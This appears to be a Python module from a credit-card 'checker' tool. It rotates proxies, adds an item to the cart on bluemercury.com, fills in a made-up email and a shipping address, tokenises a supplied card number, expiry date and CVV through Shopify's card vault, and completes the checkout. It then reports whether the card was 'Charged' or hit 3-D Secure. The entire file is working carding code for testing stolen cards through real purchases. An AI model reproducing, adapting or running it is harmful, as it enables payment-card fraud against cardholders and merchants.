from all.configs._def_main_ import *

@retry(stop=stop_after_attempt(3))
async def auto_sho_async(cc, mes, ano, cvv):

    proxy_url = random.choice(proxies)

    conn = aiohttp_proxy.ProxyConnector.from_url(proxy_url)

    async with aiohttp.ClientSession(connector=conn) as session:

        payload_1 = {
            'id': '39986198380619'
        }

        req1 = await session.post(url=f'https://bluemercury.com/cart/add.js', data=payload_1, timeout=aiohttp.ClientTimeout(total=5))

        req3 = await session.get(url=f"https://bluemercury.com/checkout", timeout=aiohttp.ClientTimeout(total=5))

        checkout_url = req3.url

        print(Fore.GREEN +
              f"[ + ] URL CHECKOUT: {checkout_url}" + Fore.RESET)

        authenticity_token = get_random_string(86)

        headers = {

            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'

        }

        payload_2 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D=idksylphietteidk%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bfirst_name%5D=sadsa&checkout%5Bshipping_address%5D%5Blast_name%5D=sadsa&checkout%5Bshipping_address%5D%5Baddress1%5D=2531+Cimmaron+Road&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=Santa+Ana&checkout%5Bshipping_address%5D%5Bprovince%5D=CA&checkout%5Bshipping_address%5D%5Bzip%5D=92704&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=548&checkout%5Bclient_details%5D%5Bbrowser_height%5D=696&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360'

        req4 = await session.post(url=checkout_url, headers=headers, data=payload_2, timeout=aiohttp.ClientTimeout(total=5))

        payload_3 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-Ground%2520Shipping%2520%287-10%2520days%29-7.00&checkout%5Bclient_details%5D%5Bbrowser_width%5D=548&checkout%5Bclient_details%5D%5Bbrowser_height%5D=696&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360'

        req5 = await session.post(url=checkout_url, headers=headers, data=payload_3, timeout=aiohttp.ClientTimeout(total=5))

        payload_4 = {
            "credit_card": {
                "number": f"{cc[0:4]} {cc[4:8]} {cc[8:12]} {cc[12:16]}",
                "name": "Idk Idk",
                "month": mes,
                "year": ano,
                "verification_value": cvv
            },
            "payment_session_scope": "bluemercury.com"
        }

        req6 = await session.post(url='https://deposit.us.shopifycs.com/sessions', json=payload_4, timeout=aiohttp.ClientTimeout(total=5))

        token = await req6.json()

        id_ = token.get('id')

        print(Fore.GREEN +
              f"[ + ] TOKEN ID: {id_}" + Fore.RESET)

        payload_5 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=payment_method&step=&s={id_}&checkout%5Bpayment_gateway%5D=38621315147&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D=916&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=548&checkout%5Bclient_details%5D%5Bbrowser_height%5D=696&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360'

        req7 = await session.post(url=checkout_url, headers=headers, data=payload_5, timeout=aiohttp.ClientTimeout(total=8))

        await asyncio.sleep(5)

        processing_url = req7.url

        print(Fore.GREEN +
              f"[ + ] URL PROCESADA: {processing_url}" + Fore.RESET)

        req8 = await session.get(str(processing_url) + '?from_processing_page=1', timeout=aiohttp.ClientTimeout(total=5))

        await asyncio.sleep(5)

        req9 = await session.get(req8.url, timeout=aiohttp.ClientTimeout(total=5))

        text_resp = await req9.text()

        resp = find_between(text_resp, 'notice__text">', '<')

        if '/thank_you' in str(req9.url) or '/orders/' in str(req9.url) or '/post_purchase' in str(req9.url):

            resp = 'Charged'

        elif '/3d_secure_2/' in str(req9.url):

            resp = '3d_secure_2'

        print(resp)

        return resp